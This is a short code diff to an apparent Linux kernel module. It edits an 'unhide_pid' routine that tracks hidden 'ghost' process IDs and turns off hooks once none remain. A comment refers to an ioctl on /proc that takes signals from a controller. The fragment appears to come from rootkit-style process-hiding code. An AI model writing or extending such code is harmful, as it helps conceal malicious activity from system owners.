@@ -269,7 +269,7 @@ unhide_pid(unsigned long pid)
 	int i;
 	for (i = 0; i < 4; i++)
 	{
-		if (ghost_pids[i] == pid)
+		if (ghost_pids[i] == pid && pid != 0)
 		{
 			ghost_pids[i] = 0;
 			ghost_count--;
@@ -277,13 +277,14 @@ unhide_pid(unsigned long pid)
 		}
 	}
 
-	if (ghost_count != 0)
+	if (ghost_count > 0)
 	{
 		return;
 	}
 
 	// No ghosts remaining, restore to normal
 	enabled = 0;
+	pr_debug("pr_io - disabling man pac hooks\n");
 }
 
 // ioctl on /proc, receives signals from manpac
